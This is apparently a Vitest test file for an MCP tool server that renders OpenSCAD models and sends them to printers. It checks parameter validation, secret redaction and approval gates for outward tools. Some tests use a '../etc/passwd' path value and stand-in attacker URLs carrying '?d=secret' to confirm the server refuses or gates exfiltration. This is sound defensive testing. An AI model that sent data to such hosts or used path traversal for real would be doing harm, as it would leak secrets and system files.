import { readFileSync } from 'node:fs'
import { http, HttpResponse } from 'msw'
import { setupServer } from 'msw/node'
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest'
import { tiersUpTo } from '../src/auth/principal.js'
import { ALL_TOOLS } from '../src/tools/index.js'
import { PendingActionStore } from '../src/tools/pending.js'
import { runTool, type Tool, type ToolContext } from '../src/tools/registry.js'
import { sameRepository } from '../src/tools/libraries.js'
import { redact } from '../src/tools/settings.js'
import { validateParams } from '../src/tools/validate.js'
import { OPENSCAD_COLOUR_NAMES } from '../src/tools/colours.js'
import { BACKEND, firstText, services } from './helpers/mcp.js'

// Handlers against an msw backend, called with `execute` where a test needs
// an outward tool's real behaviour (after approval, #258), and through
// `runTool` where the gate is the point.

const server = setupServer()
beforeAll(() => server.listen({ onUnhandledRequest: 'error' }))
afterEach(() => server.resetHandlers())
afterAll(() => server.close())

function tool(name: string): Tool {
  const t = ALL_TOOLS.find((x) => x.name === name)
  if (!t) throw new Error(`no tool ${name}`)
  return t
}

function ctx(overrides: Partial<ToolContext> = {}): ToolContext {
  return {
    ...services(),
    principal: { id: 'test', kind: 'browser', tiers: tiersUpTo('outward') },
    progress: async () => {},
    signal: new AbortController().signal,
    ...overrides,
  }
}

const SCHEMA = {
  groups: [],
  parameters: [
    { name: 'width', type: 'number', initial: 10, min: 1, max: 100 },
    { name: 'count', type: 'integer', initial: 2 },
    { name: 'style', type: 'select', initial: 'round', options: [{ name: 'Round', value: 'round' }, { name: 'Square', value: 'square' }] },
    { name: 'label', type: 'string', initial: '', max_length: 5 },
    { name: 'colour', type: 'color', initial: '#ff0000' },
    { name: 'logo', type: 'file', initial: 'default-logo.svg', accept: ['svg'], samples: ['default-logo.svg', 'star.svg'] },
  ],
}

describe('validateParams', () => {
  it('accepts values the customizer could produce and reports effective values', () => {
    const report = validateParams(SCHEMA as never, { width: 50, style: 'square', colour: '#00ff00' })
    expect(report.valid).toBe(true)
    expect(report.effective).toMatchObject({ width: 50, count: 2, style: 'square', label: '' })
  })

  it('names each problem', () => {
    const report = validateParams(SCHEMA as never, {
      width: 500,
      count: 1.5,
      style: 'hex',
      label: 'too long',
      colour: 'not a colour!',
      logo: 'other.svg',
      nope: 1,
    })
    expect(report.valid).toBe(false)
    expect(Object.fromEntries(report.issues.map((i) => [i.param, i.problem]))).toEqual({
      width: 'must be at most 100',
      count: 'must be a whole number',
      style: 'must be one of "round", "square"',
      label: 'must be at most 5 characters',
      colour: 'must be a colour: #rgb, #rgba, #rrggbb or #rrggbbaa, or an SVG colour name OpenSCAD knows (e.g. "red")',
      logo: 'must be "" (none), the default ("default-logo.svg"), a sample file ("default-logo.svg", "star.svg"), or an asset id from upload_asset',
      nope: 'is not a parameter of this model',
    })
  })
})

describe('validateParams: file values the backend accepts (assets.py file_assets)', () => {
  const ok = (logo: string) => validateParams(SCHEMA as never, { logo }).valid
  it('accepts "", the non-empty default, a shipped sample and an uploaded asset id', () => {
    expect(ok('')).toBe(true)
    expect(ok('default-logo.svg')).toBe(true)
    expect(ok('star.svg')).toBe(true)
    expect(ok('c'.repeat(64))).toBe(true)
  })
  it('refuses anything else, including a path', () => {
    expect(ok('other.svg')).toBe(false)
    expect(ok('../etc/passwd')).toBe(false)
  })
})

describe('validateParams: colours OpenSCAD knows', () => {
  const ok = (colour: string) => validateParams(SCHEMA as never, { colour }).valid
  it('accepts SVG names in any case and every hex form', () => {
    for (const c of ['red', 'CornflowerBlue', ' darkslategrey ', '#f00', '#f008', '#ff0000', '#ff000080']) {
      expect(ok(c), c).toBe(true)
    }
  })
  it('refuses unknown names and malformed hex', () => {
    for (const c of ['cerulean', 'banana', 'rebeccapurple', 'ff0000', '#ff000', '#gg0000', '']) expect(ok(c), c).toBe(false)
  })
  it("matches the backend's measured list (backend/scadbuddy/render/colours.py CSS_COLOURS) exactly", () => {
    const source = readFileSync(new URL('../../backend/scadbuddy/render/colours.py', import.meta.url), 'utf8')
    const block = /CSS_COLOURS[^{]*\{([\s\S]*?)\n\}/.exec(source)?.[1] ?? ''
    const backend = [...block.matchAll(/"([^"]+)"\s*:/g)].map((m) => m[1])
    expect(backend.length).toBeGreaterThan(100)
    expect([...OPENSCAD_COLOUR_NAMES].sort()).toEqual(backend.sort())
  })
})

describe('redact', () => {
  it('hides secret-looking fields but keeps has_* flags', () => {
    expect(redact({ bambuddy_url: 'http://b', has_api_key: true, api_key: 'k', nested: [{ token: 't' }] })).toEqual({
      bambuddy_url: 'http://b',
      has_api_key: true,
      api_key: '[redacted]',
      nested: [{ token: '[redacted]' }],
    })
  })
})

describe('render_model', () => {
  it('refuses invalid parameters before queueing anything', async () => {
    server.use(http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)))
    const result = await runTool(tool('render_model'), { slug: 'box', params: { width: 0 } }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toBe('not rendered: width must be at least 1')
  })

  it('reports a failed render as a tool error with its log', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)),
      http.post(`${BACKEND}/api/v1/models/box/render`, () => HttpResponse.json({ job_id: 'j', status_url: '' }, { status: 202 })),
      http.get(`${BACKEND}/api/v1/jobs/j`, () =>
        HttpResponse.json({ id: 'j', slug: 'box', created_at: '', status: 'failed', error: 'syntax error', log_tail: ['ERROR: line 3'] }),
      ),
    )
    const result = await runTool(tool('render_model'), { slug: 'box' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toMatchObject({ status: 'failed', error: 'syntax error', log_tail: ['ERROR: line 3'] })
  })

  it('hands back a still-running job after the wait, and saves an output when asked', async () => {
    let status = 'running'
    let saved: unknown
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)),
      http.post(`${BACKEND}/api/v1/models/box/render`, () => HttpResponse.json({ job_id: 'j', status_url: '' }, { status: 202 })),
      http.get(`${BACKEND}/api/v1/jobs/j`, () => HttpResponse.json({ id: 'j', slug: 'box', created_at: '', status })),
      http.post(`${BACKEND}/api/v1/models/box/outputs`, async ({ request }) => {
        saved = await request.json()
        return HttpResponse.json({ id: 'out-1' }, { status: 201 })
      }),
    )
    const waiting = await runTool(tool('render_model'), { slug: 'box' }, ctx({ renderWaitMs: 20 }))
    expect(firstText(waiting)).toMatchObject({ status: 'running', note: expect.stringContaining('get_render_job') })

    status = 'done'
    const done = await runTool(tool('render_model'), { slug: 'box', save_output: true, output_name: 'v1' }, ctx())
    expect(firstText(done)).toMatchObject({ status: 'done', output: { id: 'out-1' } })
    expect(saved).toEqual({ job_id: 'j', name: 'v1' })
  })
})

describe('uploads', () => {
  it('sends a base64 file as multipart form data', async () => {
    let received: { type: string | null; name: string | undefined; bytes: number } | undefined
    server.use(
      http.post(`${BACKEND}/api/v1/models/box/assets`, async ({ request }) => {
        const form = await request.formData()
        const file = form.get('file') as File
        received = { type: request.headers.get('content-type'), name: file.name, bytes: file.size }
        return HttpResponse.json({ id: 'a'.repeat(64) }, { status: 201 })
      }),
    )
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>').toString('base64')
    const result = await runTool(tool('upload_asset'), { slug: 'box', filename: 'logo.svg', content_base64: svg }, ctx())
    expect(result.isError).toBeFalsy()
    expect(received?.type).toMatch(/^multipart\/form-data; boundary=/)
    expect(received).toMatchObject({ name: 'logo.svg', bytes: 41 })
  })
})

describe('print_output (as it will run once approved, #258)', () => {
  it('checks eligibility, then runs the pipeline', async () => {
    let run: unknown
    server.use(
      http.post(`${BACKEND}/api/v1/print/outputs/out-1/eligibility`, () =>
        HttpResponse.json({ library_file_id: 5, reports: [{ pipeline_id: 3, report: { ok: true, issues: [] } }] }),
      ),
      http.post(`${BACKEND}/api/v1/print/outputs/out-1/run`, async ({ request }) => {
        run = await request.json()
        return HttpResponse.json({ route: 'pipeline' })
      }),
    )
    const result = await tool('print_output').execute({ output_id: 'out-1', pipeline_id: 3, copies: 2 }, ctx())
    expect(result.isError).toBeFalsy()
    expect(run).toMatchObject({ pipeline_id: 3, copies: 2, plate_id: 1, all_plates: false, force: false, options: {} })
  })

  it('stops on a blocking eligibility issue unless forced', async () => {
    server.use(
      http.post(`${BACKEND}/api/v1/print/outputs/out-1/eligibility`, () =>
        HttpResponse.json({ library_file_id: 5, reports: [{ pipeline_id: 3, report: { ok: false, issues: [{ kind: 'nozzle' }] } }] }),
      ),
    )
    const result = await tool('print_output').execute({ output_id: 'out-1', pipeline_id: 3 }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toMatchObject({ status: 'ineligible' })
  })

  function defaultPipeline(id: number | null) {
    return [
      http.get(`${BACKEND}/api/v1/outputs/out-1`, () => HttpResponse.json({ id: 'out-1', slug: 'box' })),
      http.get(`${BACKEND}/api/v1/print/models/box/pipelines`, () =>
        HttpResponse.json({ pipelines: [], printers: [], default_pipeline_id: id, model_choices: {}, printer_bed_types: {} }),
      ),
    ]
  }

  it('checks the DEFAULT pipeline too, and never runs when it is blocked', async () => {
    let checked: unknown
    let ran = false
    server.use(
      ...defaultPipeline(7),
      http.post(`${BACKEND}/api/v1/print/outputs/out-1/eligibility`, async ({ request }) => {
        checked = await request.json()
        return HttpResponse.json({ library_file_id: 5, reports: [{ pipeline_id: 7, report: { ok: false, issues: [{ kind: 'printer_offline' }] } }] })
      }),
      http.post(`${BACKEND}/api/v1/print/outputs/out-1/run`, () => {
        ran = true
        return HttpResponse.json({})
      }),
    )
    const result = await tool('print_output').execute({ output_id: 'out-1' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toMatchObject({ status: 'ineligible', pipeline_id: 7 })
    expect(checked).toEqual({ pipeline_ids: [7] })
    expect(ran).toBe(false)
  })

  it('with force, skips the check and runs the resolved default pipeline', async () => {
    let run: unknown
    server.use(
      ...defaultPipeline(7),
      // No eligibility handler: calling it would be an unhandled request.
      http.post(`${BACKEND}/api/v1/print/outputs/out-1/run`, async ({ request }) => {
        run = await request.json()
        return HttpResponse.json({ route: 'pipeline' })
      }),
    )
    const result = await tool('print_output').execute({ output_id: 'out-1', force: true }, ctx())
    expect(result.isError).toBeFalsy()
    expect(run).toMatchObject({ pipeline_id: 7, force: true })
  })

  it('refuses clearly when no pipeline resolves', async () => {
    server.use(...defaultPipeline(null))
    const result = await runTool({ ...tool('print_output'), gated: false }, { output_id: 'out-1' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('no slicer pipeline is set for model box')
  })

  it('passes a Bambuddy scope error through with its detail', async () => {
    server.use(
      http.post(`${BACKEND}/api/v1/outputs/out-1/send`, () =>
        HttpResponse.json(
          { title: 'Bambuddy API key lacks a scope', detail: 'The API key needs "Manage Library" to upload the 3MF' },
          { status: 403 },
        ),
      ),
    )
    const result = await runTool(tool('send_to_bambuddy'), { output_id: 'out-1' }, { ...ctx(), pending: new PendingActionStore() })
    // Through runTool it is only prepared …
    expect(firstText(result)).toMatchObject({ status: 'pending_approval' })
    // … and once executed, the scope error reaches the agent verbatim.
    const executed = await runTool({ ...tool('send_to_bambuddy'), gated: false }, { output_id: 'out-1' }, ctx())
    expect(executed.isError).toBe(true)
    expect(firstText(executed)).toContain('needs "Manage Library"')
  })
})

describe('analyze_geometry', () => {
  it('is a read tool returning the backend analysis', async () => {
    const id = 'a'.repeat(32)
    server.use(
      http.get(`${BACKEND}/api/v1/outputs/${id}/geometry`, () => HttpResponse.json({ open_edges: 0, bbox_mm: { size: [1, 2, 3] } })),
    )
    const t = tool('analyze_geometry')
    expect(t.risk).toBe('read')
    const result = await runTool(t, { output_id: id }, ctx({ principal: { id: 'r', kind: 'bearer', tiers: ['read'] } }))
    expect(firstText(result)).toEqual({ open_edges: 0, bbox_mm: { size: [1, 2, 3] } })
  })
})

describe('tools that make the backend fetch a URL (exfiltration, not SSRF)', () => {
  const CATALOGUE = [{ name: 'BOSL2', url: 'https://github.com/BelfrySCAD/BOSL2', ref: 'v2.0.0', homepage: '', licence: '' }]

  it('import_model is gated: it only prepares, the backend is never called', async () => {
    const result = await runTool(tool('import_model'), { url: 'https://evil.example/x?d=secret' }, ctx())
    expect(firstText(result)).toMatchObject({
      status: 'pending_approval',
      summary: 'Fetch and import a model from https://evil.example/x?d=secret',
    })
  })

  it('pin_library runs unattended for a catalogue library, with or without its own URL', async () => {
    const puts: unknown[] = []
    server.use(
      http.get(`${BACKEND}/api/v1/libraries`, () => HttpResponse.json(CATALOGUE)),
      http.put(`${BACKEND}/api/v1/models/box/libraries/BOSL2`, async ({ request }) => {
        puts.push(await request.json())
        return HttpResponse.json({ slug: 'box' })
      }),
    )
    expect((await runTool(tool('pin_library'), { slug: 'box', name: 'BOSL2' }, ctx())).isError).toBeFalsy()
    const sameRepo = { slug: 'box', name: 'BOSL2', url: 'HTTPS://GitHub.com/BelfrySCAD/BOSL2.git/', ref: 'v2.1.0' }
    expect((await runTool(tool('pin_library'), sameRepo, ctx())).isError).toBeFalsy()
    expect(puts).toEqual([
      { ref: null, url: null },
      { ref: 'v2.1.0', url: null },
    ])
  })

  it('pin_library refuses a non-catalogue URL and points to the outward tool', async () => {
    let put = false
    server.use(
      http.get(`${BACKEND}/api/v1/libraries`, () => HttpResponse.json(CATALOGUE)),
      http.put(`${BACKEND}/api/v1/models/box/libraries/:name`, () => {
        put = true
        return HttpResponse.json({})
      }),
    )
    for (const args of [
      { slug: 'box', name: 'BOSL2', url: 'https://attacker.example/BOSL2?d=secret' },
      { slug: 'box', name: 'NotInCatalogue', url: 'https://github.com/BelfrySCAD/BOSL2' },
    ]) {
      const result = await runTool(tool('pin_library'), args, ctx())
      expect(result.isError).toBe(true)
      expect(firstText(result)).toContain('pin_library_from_url')
    }
    expect(put).toBe(false)
  })

  it('pin_library_from_url is gated', async () => {
    const result = await runTool(
      tool('pin_library_from_url'),
      { slug: 'box', name: 'mylib', url: 'https://example.com/mylib.git', ref: 'v1' },
      ctx(),
    )
    expect(firstText(result)).toMatchObject({ status: 'pending_approval' })
    expect(tool('pin_library_from_url').risk).toBe('outward')
    expect(tool('import_model').risk).toBe('outward')
    expect(tool('pin_library').risk).toBe('write')
  })

  it('compares repositories the way the backend does', () => {
    expect(sameRepository('https://github.com/o/r', 'HTTPS://GITHUB.COM/o/r.git/')).toBe(true)
    expect(sameRepository('https://github.com/o/r', 'https://github.com/O/r')).toBe(false)
    expect(sameRepository('https://github.com/o/r', 'https://github.com/o/r2')).toBe(false)
  })
})

describe('binary results: inline under the cap, a link over it', () => {
  const OUT = 'a'.repeat(32)

  it('returns a small 3MF inline as an embedded resource', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/outputs/${OUT}/model.3mf`, () =>
        new HttpResponse(new Uint8Array([1, 2, 3, 4]), { headers: { 'content-type': 'model/3mf' } }),
      ),
    )
    const result = await runTool(tool('download_3mf'), { output_id: OUT }, ctx({ maxInlineBytes: 16 }))
    expect(result.isError).toBeFalsy()
    expect(result.content).toEqual([
      {
        type: 'resource',
        resource: { uri: `scadbuddy://outputs/${OUT}/model.3mf`, mimeType: 'model/3mf', blob: 'AQIDBA==' },
      },
    ])
  })

  it('links, not fails, when the declared size is over the cap', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/outputs/${OUT}/model.3mf`, () =>
        new HttpResponse(new Uint8Array(64), { headers: { 'content-type': 'model/3mf', 'content-length': '64' } }),
      ),
    )
    const result = await runTool(
      tool('download_3mf'),
      { output_id: OUT },
      ctx({ maxInlineBytes: 16, publicBaseUrl: 'https://scadbuddy.example/' }),
    )
    expect(result.isError).toBeFalsy()
    expect(result.content[0]).toMatchObject({
      type: 'resource_link',
      uri: `https://scadbuddy.example/api/v1/outputs/${OUT}/model.3mf`,
      mimeType: 'model/3mf',
      size: 64,
    })
    expect(JSON.parse((result.content[1] as { text: string }).text)).toMatchObject({
      inline: false,
      size_bytes: 64,
      fetch: { method: 'GET', path: `/api/v1/outputs/${OUT}/model.3mf` },
    })
  })

  it('links when a streamed body with no length outgrows the cap, and uses the bare path without a public URL', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/jobs/j1/preview.glb`, () => {
        const body = new ReadableStream<Uint8Array>({
          start(controller) {
            for (let i = 0; i < 8; i++) controller.enqueue(new Uint8Array(8))
            controller.close()
          },
        })
        return new HttpResponse(body, { headers: { 'content-type': 'model/gltf-binary' } })
      }),
    )
    const result = await runTool(tool('get_render_preview'), { job_id: 'j1' }, ctx({ maxInlineBytes: 16 }))
    expect(result.isError).toBeFalsy()
    expect(result.content[0]).toMatchObject({ type: 'resource_link', uri: '/api/v1/jobs/j1/preview.glb' })
    expect((result.content[1] as { text: string }).text).toContain('SCADBUDDY_PUBLIC_URL')
  })

  it('get_asset with content: small image inline, large one linked', async () => {
    const asset = 'b'.repeat(64)
    let size = 4
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/assets/${asset}`, () => HttpResponse.json({ id: asset })),
      http.get(`${BACKEND}/api/v1/models/box/assets/${asset}/content`, () =>
        new HttpResponse(new Uint8Array(size), { headers: { 'content-type': 'image/png' } }),
      ),
    )
    const args = { slug: 'box', asset_id: asset, include_content: true }
    const small = await runTool(tool('get_asset'), args, ctx({ maxInlineBytes: 16 }))
    expect(small.content.map((c) => c.type)).toEqual(['text', 'image'])
    size = 64
    const large = await runTool(tool('get_asset'), args, ctx({ maxInlineBytes: 16 }))
    expect(large.isError).toBeFalsy()
    expect(large.content.map((c) => c.type)).toEqual(['text', 'resource_link', 'text'])
  })
})

describe("tools for #324's routes", () => {
  const CATALOGUE = [{ name: 'BOSL2', url: 'https://github.com/BelfrySCAD/BOSL2', ref: 'v2.0.0', homepage: '', licence: '' }]
  const model = (url: string) => ({ slug: 'box', name: 'Box', libraries: [{ name: 'BOSL2', url, ref: 'main', commit: 'a'.repeat(40) }] })

  it('reads diagnostics, installed libraries and asset usage', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/diagnostics`, () => HttpResponse.json({ warnings: [{ line: 3 }] })),
      http.get(`${BACKEND}/api/v1/libraries/installed`, () => HttpResponse.json([{ name: 'BOSL2', commit: 'c', used_by: ['box'] }])),
      http.get(`${BACKEND}/api/v1/assets/usage`, () => HttpResponse.json({ count: 1, bytes: 2, max_count: 0, max_total_bytes: 0 })),
    )
    expect(firstText(await runTool(tool('get_render_diagnostics'), { slug: 'box' }, ctx()))).toEqual({ warnings: [{ line: 3 }] })
    expect(firstText(await runTool(tool('list_installed_libraries'), {}, ctx()))).toEqual([{ name: 'BOSL2', commit: 'c', used_by: ['box'] }])
    expect(firstText(await runTool(tool('get_asset_usage'), {}, ctx()))).toMatchObject({ count: 1 })
  })

  it('draws a view inline, and links it when it is over the cap', async () => {
    const job = 'd'.repeat(32)
    let requested = ''
    server.use(
      http.get(`${BACKEND}/api/v1/jobs/${job}/views/top.png`, ({ request }) => {
        requested = new URL(request.url).search
        return new HttpResponse(new Uint8Array(32), { headers: { 'content-type': 'image/png' } })
      }),
    )
    const inline = await runTool(tool('get_render_view'), { job_id: job, view: 'top', size: 256 }, ctx())
    expect(inline.content[0]).toMatchObject({ type: 'image', mimeType: 'image/png' })
    expect(requested).toBe('?size=256')
    const linked = await runTool(tool('get_render_view'), { job_id: job, view: 'top' }, ctx({ maxInlineBytes: 8 }))
    expect(linked.content[0]).toMatchObject({ type: 'resource_link', uri: `/api/v1/jobs/${job}/views/top.png` })
  })

  it('removing a library checkout is outward (irreversible) and only prepares', async () => {
    expect(tool('remove_library_checkout').risk).toBe('outward')
    const result = await runTool(tool('remove_library_checkout'), { name: 'BOSL2' }, ctx())
    expect(firstText(result)).toMatchObject({ status: 'pending_approval', summary: 'Delete every checkout of library BOSL2' })
  })

  it('re-pins a catalogue library unattended, and refuses one pinned from another URL', async () => {
    let pinnedFrom = CATALOGUE[0]!.url
    let patched: unknown
    server.use(
      http.get(`${BACKEND}/api/v1/models/box`, () => HttpResponse.json(model(pinnedFrom))),
      http.get(`${BACKEND}/api/v1/libraries`, () => HttpResponse.json(CATALOGUE)),
      http.patch(`${BACKEND}/api/v1/models/box/libraries/BOSL2`, async ({ request }) => {
        patched = await request.json()
        return HttpResponse.json({ slug: 'box' })
      }),
    )
    expect((await runTool(tool('repin_library'), { slug: 'box', name: 'BOSL2', ref: 'v2.1.0' }, ctx())).isError).toBeFalsy()
    expect(patched).toEqual({ ref: 'v2.1.0' })

    patched = undefined
    pinnedFrom = 'https://attacker.example/BOSL2'
    const refused = await runTool(tool('repin_library'), { slug: 'box', name: 'BOSL2' }, ctx())
    expect(refused.isError).toBe(true)
    expect(firstText(refused)).toContain('repin_library_from_pinned_url')
    expect(patched).toBeUndefined()

    expect(firstText(await runTool(tool('repin_library_from_pinned_url'), { slug: 'box', name: 'BOSL2' }, ctx()))).toMatchObject({
      status: 'pending_approval',
    })
  })
})

describe('base64 inputs', () => {
  it('refuses malformed base64 instead of uploading truncated bytes', async () => {
    const result = await runTool(tool('upload_asset'), { slug: 'box', filename: 'a.png', content_base64: 'iVBOR!!w0K' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('not valid base64')
  })
})

describe('invalid arguments', () => {
  it('come back as a tool error, not an exception', async () => {
    const result = await runTool(tool('get_model'), { slug: 'Not A Slug' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('invalid arguments')
  })
})
